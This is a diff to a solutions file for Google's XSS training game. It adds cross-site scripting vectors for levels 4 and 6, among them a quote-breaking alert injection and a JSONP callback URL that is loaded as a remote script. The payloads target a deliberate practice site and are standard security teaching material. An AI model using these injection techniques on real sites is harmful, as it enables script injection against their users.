@@ -25,7 +25,11 @@ https://xss-game.appspot.com/level3/frame#'/><script>alert(1)</script>
 https://xss-game.appspot.com/level4/frame?timer=1')%3Balert('1
 *** Vector *** 
 1')%3Balert('1
- 
+
+*** Query *** 
+https://xss-game.appspot.com/level4/frame?timer=1')%2Balert('1
+*** Vector *** 
+1')%2Balert('1 
 ########################## Level 5: Breaking protocol ########################## 
  
 *** Query *** 
@@ -38,4 +42,4 @@ javascript:alert(1)
 *** Query ***
 https://xss-game.appspot.com/level6/frame#HTTPS://dj-infosec.divshot.io/content.js
 *** Vector ***
-HTTPS://dj-infosec.divshot.io/content.js
+HTTPS://www.google.com/jsapi?callback=alert
